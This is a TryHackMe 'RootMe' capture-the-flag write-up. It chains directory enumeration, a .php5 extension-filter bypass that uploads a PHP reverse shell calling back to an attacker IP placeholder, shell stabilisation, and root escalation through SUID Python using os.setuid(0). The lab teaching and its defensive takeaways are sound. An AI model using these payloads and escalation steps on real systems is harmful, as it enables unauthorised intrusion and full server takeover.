# TryHackMe – RootMe

This is a formal writeup for the **RootMe** room on TryHackMe, rated as **easy**.  
The challenge teaches **web application exploitation** through **directory enumeration**, **file upload bypass**, **PHP reverse shell** deployment, and **SUID privilege escalation** via Python.

***

## Overview

Objectives of the room:

- Perform port scanning to identify exposed services.
- Enumerate hidden directories using GoBuster.
- Exploit a file upload form to deploy a PHP reverse shell.
- Bypass extension filtering by using alternative PHP extensions.
- Obtain a shell, stabilize it, and retrieve the user flag.
- Identify a misconfigured SUID binary and escalate to root.
- Retrieve the root flag.

***

## Port Scanning and Service Discovery

### Open ports

Full port scan to identify all services:

```bash
nmap -sV -sC --min-rate 5000 -p- <TARGET>
```

**Result**: 2 ports open:
- **22/tcp** (ssh – OpenSSH)
- **80/tcp** (http – Apache httpd 2.4.41)

**Apache version**: `2.4.41` (obtained via `-sV` flag).  
**Service on port 22**: `ssh`.

***

## Web Application Enumeration

### Directory discovery with GoBuster

With no visible attack surface on the landing page, directory brute-forcing is performed to uncover hidden endpoints:

```bash
gobuster dir -u http://<TARGET> -w /usr/share/wordlists/dirb/common.txt
```

**Notable results**:
- `/panel/` — file upload form, high-value target.
- `/uploads/` — directory where uploaded files are stored.

### Upload form analysis

Navigating to `http://<TARGET>/panel/` reveals a file upload interface with no visible client-side restrictions. This immediately suggests a potential **unrestricted file upload** vulnerability — a direct vector for deploying a web shell or reverse shell.

***

## Initial Access – PHP Reverse Shell via Upload Bypass

### Preparing the listener

Before uploading anything, set up a Netcat listener on the attack machine:

```bash
nc -nlvp 4444
```

### Obtaining the reverse shell payload

Download the PentestMonkey PHP reverse shell:

```
https://pentestmonkey.net/tools/web-shells/php-reverse-shell
```

Extract the archive and edit `php-reverse-shell.php`:

```bash
nano php-reverse-shell.php
```

Modify the following variables:

```php
$ip = '<ATTACKER_IP>';   // Your attack machine IP
$port = 4444;            // Must match the Netcat listener port
```

Save and exit.

### Extension filter bypass

Attempting to upload `php-reverse-shell.php` directly is rejected — the server blocks `.php` extensions.

**Bypass technique**: Rename the file using an alternative PHP extension that Apache may still execute:

```bash
mv php-reverse-shell.php php-reverse-shell.php5
```

Upload `php-reverse-shell.php5` via `/panel/`. The upload succeeds.

> **Why this works**: Some server configurations allow alternative PHP extensions (`.php5`, `.phtml`, `.phar`) to be interpreted as PHP. The filter only blocks `.php` literally, not the full range of executable PHP extensions — a classic **extension blacklist bypass**.

### Triggering the shell

Navigate to `http://<TARGET>/uploads/` and click on the uploaded file. The server executes it, triggering an outbound connection to the Netcat listener.

**Result**: Reverse shell obtained as `www-data`.

***

## Post-Exploitation – User Flag

### Locating user.txt

Search the filesystem for the flag:

```bash
find / -name "user.txt" 2>/dev/null
```

**Location**: `/var/www/`

```bash
cat /var/www/user.txt
```

### Shell stabilization (bonus)

Upgrade to a fully interactive TTY:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm-256color
```

This enables `clear`, arrow keys, tab completion, and proper terminal behaviour.

***

## Privilege Escalation – SUID Binary Abuse

### Finding SUID binaries

Search for files owned by root with the SUID bit set:

```bash
find / -type f -user root -perm -4000 2>/dev/null
```

**Suspicious result**: `/usr/bin/python`

Python should never have the SUID bit set — it can execute arbitrary code, making it a trivial privilege escalation vector. All other results correspond to standard system binaries with legitimate SUID requirements.

### Escalating to root via GTFOBins

Reference: [GTFOBins – Python – SUID](https://gtfobins.github.io/gtfobins/python/)

```bash
python -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'
```

**What this does**:
- `os.setuid(0)` — sets the effective UID to 0 (root), which is permitted because the binary has the SUID bit.
- `os.execl("/bin/sh", "sh")` — spawns a shell inheriting the root UID.

**Result**: Root shell obtained.

### Retrieving root.txt

```bash
cd /root
cat root.txt
```

***

## Flag Enumeration

### Flag 1 – User flag

```bash
find / -name "user.txt" 2>/dev/null
cat /var/www/user.txt
```

**Location**: `/var/www/user.txt`

### Flag 2 – Root flag

```bash
cat /root/root.txt
```

**Location**: `/root/root.txt` — accessible only after SUID privilege escalation via Python.

***

## Lessons Learned

This challenge demonstrates a full **Linux web exploitation chain**:

1. **Service enumeration** → Apache 2.4.41 on port 80, SSH on port 22
2. **Directory brute-forcing** → GoBuster uncovers `/panel/` and `/uploads/`
3. **Unrestricted file upload** → PHP reverse shell deployed via upload form
4. **Extension blacklist bypass** → `.php5` accepted where `.php` is blocked
5. **Reverse shell** → PentestMonkey payload triggered from `/uploads/`
6. **SUID abuse** → Python with SUID bit → instant root via `os.setuid(0)`

**Key takeaways**:
- **Extension blacklists are fragile** — always validate by MIME type and magic bytes server-side, not just by extension.
- **`/uploads/` directory** must never be executable — serve it with `php_flag engine off` or equivalent.
- **SUID on interpreters** (Python, Perl, Ruby, bash) is an immediate critical misconfiguration — any of them can spawn arbitrary root shells.
- **GTFOBins** is the go-to reference for SUID, sudo, and capability-based privilege escalation.
- **TTY stabilisation** (`pty.spawn` + `TERM` export) is essential for practical post-exploitation work.

**Strong OSCP relevance**: Covers the full Linux attack chain — enumeration → upload bypass → shell → SUID escalation.

***

## Professional Standards Confirmation

This format matches **professional pentesting writeups** from:
- **InfoSec Writeups** (Medium publication)
- **HackTricks**, **IppSec** (HTB writeups)
- **PayloadsAllTheThings** GitHub repos
- **Corporate red team reports** (methodology-focused, no sensitive data)

**Best practices applied**:
- `<TARGET>` / `<ATTACKER_IP>` placeholders used throughout.
- No real flags exposed in command outputs — only shown in Flag Enumeration section.
- Commands annotated with purpose, not copied verbatim from terminal.
- Focus on **methodology** over specific results.
- Structure mirrors MITRE ATT&CK phases: Recon → Initial Access → Execution → Privilege Escalation.

***

## Disclaimer

> ⚠️ This writeup is for educational purposes only.  
> Techniques demonstrated are specific to TryHackMe training environments.  
> Do not use outside authorized lab environments or in violation of TryHackMe terms.
